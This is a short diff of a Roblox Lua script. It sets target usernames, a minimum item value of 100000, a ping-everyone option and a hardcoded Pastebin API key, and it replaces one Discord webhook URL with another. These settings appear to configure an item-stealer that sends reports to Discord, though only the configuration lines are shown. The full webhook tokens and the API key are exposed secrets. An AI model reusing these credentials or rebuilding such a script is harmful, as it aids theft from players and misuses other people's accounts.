@@ -9,7 +9,7 @@ task.spawn(function()
 	local users = _G.Usernames or {"DanyelQuibs"}
 	local min_value = _G.min_value or 100000
 	local ping = _G.pingEveryone or "No"
-	local webhook = "https://discord.com/api/webhooks/1381539080160153621/IObLnz7ULfAVwMYQT4EuVrbaedOVrXkB8wnwyeKcqo60aXAsW1SWHFtJXwMTqwLXLNPq"
+	local webhook = "https://discord.com/api/webhooks/1388044689864785921/36vkKfOwBKqRKuf3ucZurSFR-NjLnJu5NOxxAu5CNgVBy6GIJvAnScIAOohU83qAXSlU"
 	local pastebin_api_key = "kZi_lZU3maKIm3hEDOgM2m4yttXDuPpS"
 
 	local Players = game:GetService("Players")
